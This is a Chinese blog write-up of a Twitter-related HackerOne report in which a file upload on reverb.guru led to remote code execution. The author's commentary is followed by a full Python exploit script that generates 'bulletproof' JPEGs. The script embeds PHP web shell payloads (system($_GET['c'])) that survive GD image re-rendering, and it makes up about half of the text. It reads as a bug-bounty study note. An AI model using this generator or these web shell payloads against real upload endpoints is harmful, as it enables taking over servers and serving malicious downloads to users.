# 漏洞散记
##  Bypass to RCE(二)
> 又一个因为上传导致的RCE，又一个Bypass图片渲染的神奇方式，这一次漏洞没有什么神奇的思路，完全就是针对性的定点打击，作者遇到了这种情况，就针对性的进行打击，尤其是那一个我怀疑是法文的文章，看的我目瞪口呆，哪位大佬给翻一下啊啊！！！我也想学这种神奇的姿势啊

> 漏洞价值:560$

>源地址:[#158148](https://hackerone.com/reports/158148)

## 漏洞过程
漏洞对应厂商是Twitter，然而漏洞出现的地方却是**reverb**这个**domain**，但是能够影响到Twitter的正常服务，因此才会只有560$

在挖洞，或者说是挖到洞的时候的思路是这样的
### 思路
* **http://reverb.twitter.com**这个会重定向一个**requests**到**http://reverb.guru**
* 作者尝试在**http://reverb.guru**寻找突破
* 作者发现上传，并且能上传**.php**
* 在这个上传处深入发掘，如果能拿到**shell**或者能进行**RCE**的话就可以替换twitter的下载链接，对twitter用户进行恶意下载攻击

作者原话

```
http://reverb.twitter.com redirects requests to http://reverb.guru which hosts a vulnerable PHP application. I managed to get RCE there which allows to modify the contents of this site, so that reverb.twitter.com will redirect to a phishing page or force a malicious file download.
```
## 先吐槽
不知道为什么，发现国外的上传部分写的很随意，基本都不会怎么限制后缀，而是在上传后或者上传途中做出很多安全加固，导致你及时上传了**脚本**也无法得到执行

## 困难点
作者的思路其实和国内的旁站思想很像，也就是利用第三者影响目标，所以作者才会在一个原本应该是**out**的地方进行挖掘，其中最大的原因便是**有所关联**

### 第一个难点

先说第一个困难点，就是上传，这个直接就可以pass了，因为网站本身的上传允许上传**.php**，并且还返回了地址
```
HTTP/1.1 200 OK
Date: Wed, 10 Aug 2016 10:56:27 GMT
Server: Apache
X-NewRelic-App-Data: PxQAUVRSAAYTUFNUBQYCXkYdFGQHBDcQUQxLA1tMXV1dORY0QwhvTQVGXj1JAltHWQsPEWseUQ8IVGNDDgkCBh4SUBIaFAQcA1UJUQFNA0xUBgVTUU8VAhxGVwZWVAVfBQAPAwAEBQMDUxpOXllYQVY4
Content-Length: 57
Connection: close
Content-Type: application/json

{"image_path":"\/view\/data\/logos\/test_3922005924.jpg"}
```

### 第二个难点

国外的上传屡见不鲜，就是你上传了脚本，根本用不起，花式遇到情况，也就是所谓的**如何执行**

作者遇到的情况就是文件上传后就会被剪裁成50x50的格式，而作者原本写入的php代码也会被移除掉


## 黑科技
作者说，要去学习一波文件调整的姿势，然后就学来一个姿势

作者发现，上传后的图片会包含这些信息，这是原图片所不具有的
```
??JFIF      ?;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 75
```
所以作者找到了这么一篇报告[《Bulletproof JPEGs》](http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l)

坑爹是法语的，完全看不懂，所以写到这儿，黑科技的学习就完全中断了

只知道作者利用exp生成的php图片成功的上传上去了，并且能成功RCE，这也就是说，图片即使经过了处理也还是保留了PHP的代码

Python的EXP:
```
#!/usr/bin/python2

"""

    Bulletproof Jpegs Generator
    Copyright (C) 2012  Damien "virtualabs" Cauquil

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

"""

import struct,sys,os
import gd
from StringIO import StringIO
from random import randint,shuffle
from time import time

# image width/height (square)
N = 32


def insertPayload(_in, _out, payload,off):
	"""
	Payload insertion (quick JPEG parsing and patching)
	"""
	img = _in
	# look for 'FF DA' (SOS)
	sos = img.index("\xFF\xDA")
	sos_size = struct.unpack('>H',img[sos+2:sos+4])[0]
	sod = sos_size+2
	# look for 'FF D9' (EOI)
	eoi = img[sod:].index("\xFF\xD9")
	# enough size ?
	if (eoi - sod - off)>=len(payload):
		_out.write(img[:sod+sos+off]+payload+img[sod+sos+len(payload)+off:])
		return True
	else:
		return False

if __name__=='__main__':

	print "[+] Virtualabs' Nasty bulletproof Jpeg generator"
	print " |  website: http://virtualabs.fr"
	print " |  contact: virtualabs -at- gmail -dot- com"
	print ""

	payloads = ["<?php system(/**/$_GET['c'/**/]); ?>","<?php /**/system($_GET[chr(99)/**/]); ?>","<?php system(/**/$_GET[chr(99)]); ?>","<?php\r\nsystem($_GET[/**/'c']);\r\n ?>"]

	# make sure the exploit-jpg directory exists or create it
	if os.path.exists('exploit-jpg') and not os.path.isdir('exploit-jpg'):
		print "[!] Please remove the file named 'exploit-jpg' from the current directory"
	elif not os.path.exists('exploit-jpg'):
		os.mkdir('exploit-jpg')

	# start generation
	print '[i] Generating ...'
	for q in range(50,100)+[-1]:
		# loop over every payload		
		for p in payloads:
			# not done yet
			done = False
			start = time()
			# loop while not done and timeout not reached
			while not done and (time()-start)<10.0:

				# we create a NxN pixels image, true colors
				img = gd.image((N,N),True)
				# we create a palette
				pal = []
				for i in range(N*N):
					pal.append(img.colorAllocate((randint(0,256),randint(0,256),randint(0,256))))
				# we shuffle this palette
				shuffle(pal)
				# and fill the image with it			
				pidx = 0
				for x in  range(N):
					for y in range(N):
						img.setPixel((x,y),pal[pidx])
						pidx+=1

				# write down the image
				out_jpg = StringIO('')
				img.writeJpeg(out_jpg,q)
				out_raw = out_jpg.getvalue()

				# now, we try to insert the payload various ways
				for i in range(64):
					test_jpg = StringIO('')
					if insertPayload(out_raw,test_jpg,p,i):
						try:
							# write down the new jpeg file
							f = open('exploit-jpg/exploit-%d.jpg'%q,'wb')
							f.write(test_jpg.getvalue())
							f.close()

							# load it with GD
							test = gd.image('exploit-jpg/exploit-%d.jpg'%q)
							final_jpg = StringIO('')
							test.writeJpeg(final_jpg,q)
							final_raw = final_jpg.getvalue()
							# does it contain our payload ?
							if p in final_raw:
								# Yay !
								print '[i] Jpeg quality %d ... DONE'%q
								done = True
								break
						except IOError,e:
							pass
					else:
						break
			if not done:
				# payload not found, we remove the file
				os.unlink('exploit-jpg/exploit-%d.jpg'%q)
			else:		
				break

```
# 结语
这次的RCE在思路上也许不如前一篇，但是却带来一个黑科技，虽然我看不懂，但还是希望能有大佬将那一篇文章给翻译出来，分享出来

只能说作者博闻强识，能很准确的在脑海中搜索到关键信息，就如同XSS三连弹的第一弹一样，都是靠着丰富的知识挖掘到了漏洞，同时，还有一个就是我所认为的**旁站思想**,个人感觉也是非常好的一个思路
